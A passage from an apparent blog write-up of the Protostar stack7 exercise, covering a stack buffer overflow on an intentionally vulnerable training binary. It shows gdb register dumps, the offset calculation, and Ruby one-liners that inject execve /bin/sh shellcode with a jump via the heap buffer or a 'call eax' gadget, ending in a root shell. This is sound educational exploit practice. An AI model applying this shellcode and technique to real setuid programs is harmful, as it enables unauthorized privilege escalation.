0804A008 : 41 61 30 41  61 31 41 61 - 32 41 61 33  41 61 34 41 Aa0Aa1Aa2Aa3Aa4A
0804A018 : 61 35 41 61  36 41 61 37 - 41 61 38 41  61 39 41 62 a5Aa6Aa7Aa8Aa9Ab
[0073:37634136]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
0x37634136: Error while running hook_stop:
Cannot access memory at address 0x37634136
0x37634136 in ?? ()</p>

<p>gdb> i r
eax            0x804a008    0x804a008
ecx            0x0  0x0
edx            0x1  0x1
ebx            0xb7fd7ff4   0xb7fd7ff4
esp            0xbffff750   0xbffff750
ebp            0x63413563   0x63413563
esi            0x0  0x0
edi            0x0  0x0
eip            0x37634136   0x37634136
eflags         0x210202 [ IF RF ID ]
cs             0x73 0x73
ss             0x7b 0x7b
ds             0x7b 0x7b
es             0x7b 0x7b
fs             0x0  0x0
gs             0x33 0x33
gdb> x /s $eax
0x804a008:   &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9&rdquo;
{% endcodeblock %}</p>

<p>The offset for return address is again 80 (0x37634136 in <code>pattern_offset</code>) and
<code>EAX</code> with stored <code>0x804a008</code> value points to the beginning of our buffer,
where we still can jump.</p>

<p>This is because <code>strdup()</code> allocates memory on heap and returns this address:
{% codeblock %}
man 3 strdup</p>

<p>  The strdup() function returns a pointer to a new string which is a duplicate
  of the string s.  Memory for the new string  is obtained with malloc(3), and
  can be freed with free(3).
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;X&rdquo; * (80 - sc.length) + [0x0804a008].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | /opt/protostar/bin/stack7
input path please:
got path j1X̀?É?jFX̀1?1?Phn/shh//bi??PS??
                                       ̀XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX?
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>

<p>Instead of pointing to the allocated buffer address, it is more portable to
find <code>call eax</code> instruction addresses in code and use one of them.</p>

<p>{% codeblock %}
user@protostar:~$ objdump -M intel -D /opt/protostar/bin/stack7 | grep &lsquo;call.*eax$&rsquo;
 80484bf:   ff d0                   call   eax
 80485eb:   ff d0                   call   eax
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:~$ (ruby -e &lsquo;sc=&ldquo;\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&rdquo;; print sc + &ldquo;X&rdquo; * (80 - sc.length) + [0x080484bf].pack(&ldquo;V&rdquo;)&rsquo;; cat -) | /opt/protostar/bin/stack7
input path please:
got path j1X̀?É?jFX̀1?1?Phn/shh//bi??PS??
                                       ̀XXXXXXXXXXXXXXXXXXXXXXXXX?XXXXXXXXXXXX??
id
uid=0(root) gid=1001(user) groups=0(root),1001(user)
{% endcodeblock %}</p>
]]></content>
  </entry>
  
</feed>
